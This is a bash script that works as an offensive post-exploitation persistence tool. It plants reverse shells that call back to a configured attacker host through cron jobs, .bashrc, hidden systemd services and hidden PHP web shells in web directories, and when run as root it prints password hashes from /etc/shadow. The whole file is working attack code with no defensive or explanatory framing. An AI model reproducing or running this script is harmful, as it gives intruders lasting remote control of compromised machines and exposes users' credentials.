#!/bin/bash

attackBox=0.0.0.0
attackPort=5253
cron="* * * * *"

if [ "$EUID" -eq 0 ];
then
	root="yes"
fi

if $(id | grep -qi "www-data");
then
	wwwdata="yes"
fi

if $(which bash | grep -qi bash);
then
	bash="yes"
fi

if $(which python | grep -qi python);
then
	python="yes"
fi

if $(which python3 | grep -qi python);
then
	python3="yes"
fi

if $(which nc | grep -qi nc);
then
	nc="yes"
fi

if $(which php | grep -qi php);
then
	php="yes"
fi

if $(env | grep -qi "HOME")
then
	home="yes"
fi

if $(which crontab | grep -qi crontab)
then
	crontab="yes"
fi

if $(which systemctl | grep -qi systemctl)
then
	systemctl="yes"
	export bash_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
	export python_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
	export python3_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
	export netcat_rev_shell_service=.$(mktemp -u | sed 's/.*\.//g').service
fi

if [ "$wwwdata" == "yes" ];
then
	if [ "$php" == "yes" ];
	then 
		for i in $(find $(grep --color=never www-data /etc/passwd | awk -F: '{print $6}') -type d);
		do
			export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
			echo "<?php set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
			echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
		done
	fi
fi

if [ "$crontab" == "yes" ];
then
	crontab -l 2> /dev/null > /dev/shm/.cron.sh
	if [ "$bash" == "yes" ];
	then
		echo "$cron bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1'" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in crontab"
	fi
	if [ "$python" == "yes" ];
	then
		echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in crontab"
	fi
	if [ "$python3" == "yes" ];
	then
		echo "$cron python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in crontab"
	fi
	if [ "$nc" == "yes" ];
	then
		echo "$cron nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.cron.sh
		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in crontab"
	fi
	crontab /dev/shm/.cron.sh
	rm /dev/shm/.cron.sh
fi

if [ "$home" == "yes" ];
then
	if [ "$bash" == "yes" ];
	then
		echo "bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1' 2> /dev/null & sleep .0001" >> ~/.bashrc
		echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in $(whoami)'s bashrc"
	fi
	if [ "$python" == "yes" ];
	then
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in $(whoami)'s bashrc"
	fi
	if [ "$python3" == "yes" ];
	then
		echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
		echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in $(whoami)'s bashrc"
	fi
	if [ "$nc" == "yes" ];
	then
		echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in $(whoami)'s bashrc"
	fi
fi

if [ "$root" == "yes" ];
then
	if [ "$systemctl" == "yes" ];
	then
		if [ "$bash" == "yes" ];
		then
			echo "[Service]
Type=oneshot
ExecStartPre=$(which sleep) 60
ExecStart=$(which bash) -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1' 2> /dev/null & sleep .0001
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/$bash_rev_shell_service
			chmod 644 /etc/systemd/system/$bash_rev_shell_service
			systemctl start $bash_rev_shell_service 2> /dev/null & sleep .0001
			systemctl enable $bash_rev_shell_service 2> /dev/null & sleep .0001
			echo -e "\e[92m[+]\e[0m Bash reverse shell installed as a service at /etc/systemd/system/$bash_rev_shell_service"

		fi
		if [ "$python" == "yes" ];
		then
			echo "[Service]
Type=oneshot
ExecStartPre=$(which sleep) 60
ExecStart=$(which python) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/$python_rev_shell_service
			chmod 644 /etc/systemd/system/$python_rev_shell_service
			systemctl start $python_rev_shell_service 2> /dev/null & sleep .0001
			systemctl enable $python_rev_shell_service 2> /dev/null & sleep .0001
			echo -e "\e[92m[+]\e[0m Python reverse shell installed as a service at /etc/systemd/system/$python_rev_shell_service"
		fi
		if [ "$python3" == "yes" ];
		then
			echo "[Service]
Type=oneshot
ExecStartPre=$(which sleep) 60
ExecStart=$(which python3) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/$python3_rev_shell_service
			chmod 644 /etc/systemd/system/$python3_rev_shell_service
			systemctl start $python3_rev_shell_service 2> /dev/null & sleep .0001
			systemctl enable $python3_rev_shell_service 2> /dev/null & sleep .0001
			echo -e "\e[92m[+]\e[0m Python3 reverse shell installed as a service at /etc/systemd/system/$python3_rev_shell_service"
		fi
		if [ "$nc" == "yes" ];
		then
			echo "[Service]
Type=oneshot
ExecStartPre=$(which sleep) 60
ExecStart=$(which nc) $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/$netcat_rev_shell_service
			chmod 644 /etc/systemd/system/$netcat_rev_shell_service
			systemctl start $netcat_rev_shell_service 2> /dev/null & sleep .0001
			systemctl enable $netcat_rev_shell_service 2> /dev/null & sleep .0001
			echo -e "\e[92m[+]\e[0m Netcat reverse shell installed as a service at /etc/systemd/system/$netcat_rev_shell_service"
		fi
	fi
	if [ "$php" == "yes" ];
	then 
		for i in $(find $(grep --color=never www-data /etc/passwd | awk -F: '{print $6}') -type d);
		do
			export php_webshell=.$(mktemp -u | sed 's/.*\.//g').php
			echo "<?php set_time_limit (0);\$ip = '$attackBox';\$port = $attackPort;\$chunk_size = 1400;\$write_a = null; \$error_a = null; \$shell = '/bin/sh -i'; \$daemon = 0; \$debug = 0;  if (function_exists('pcntl_fork')) {     \$pid = pcntl_fork();          if (\$pid == -1) {         printit(\"ERROR: Can't fork\");         exit(1);     }             if (\$pid) {         exit(0);     }         if (posix_setsid() == -1) {         printit(\"Error: Can't setsid()\");         exit(1);     }         \$daemon = 1; } else {     printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\"); }  chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30); if (!\$sock) {     printit(\"\$errstr (\$errno)\");     exit(1); }  \$descriptorspec = array(    0 => array(\"pipe\", \"r\"),    1 => array(\"pipe\", \"w\"),    2 => array(\"pipe\", \"w\") );  \$process = proc_open(\$shell, \$descriptorspec, \$pipes);  if (!is_resource(\$process)) {     printit(\"ERROR: Can't spawn shell\");     exit(1); }  stream_set_blocking(\$pipes[0], 0);  stream_set_blocking(\$pipes[1], 0);  stream_set_blocking(\$pipes[2], 0);  stream_set_blocking(\$sock, 0);   printit(\"Successfully opened reverse shell to \$ip:\$port\");  while (1) {     if (feof(\$sock)) {         printit(\"ERROR: Shell connection terminated\");         break;     }         if (feof(\$pipes[1])) {         printit(\"ERROR: Shell process terminated\");         break;     }         \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);     \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);      if (in_array(\$sock, \$read_a)) {         if (\$debug) printit(\"SOCK READ\");         \$input = fread(\$sock, \$chunk_size);         if (\$debug) printit(\"SOCK: \$input\");         fwrite(\$pipes[0], \$input);     }         if (in_array(\$pipes[1], \$read_a)) {         if (\$debug) printit(\"STDOUT READ\");         \$input = fread(\$pipes[1], \$chunk_size);         if (\$debug) printit(\"STDOUT: \$input\");         fwrite(\$sock, \$input);     }         if (in_array(\$pipes[2], \$read_a)) {         if (\$debug) printit(\"STDERR READ\");         \$input = fread(\$pipes[2], \$chunk_size);         if (\$debug) printit(\"STDERR: \$input\");         fwrite(\$sock, \$input);     }    }  fclose(\$sock); fclose(\$pipes[0]); fclose(\$pipes[1]); fclose(\$pipes[2]); proc_close(\$process);  function printit (\$string) {     if (!\$daemon) {         print \"\$string\n\";     }    }  ?>" > $i/$php_webshell
			echo -e "\e[92m[+]\e[0m PHP reverse shell placed in $i/$php_webshell"
		done
	fi
	echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
	egrep -v "\*|\!" /etc/shadow
fi

echo ""
echo -e "\e[92m[+]\e[0m All shells call back to $attackBox:$attackPort"
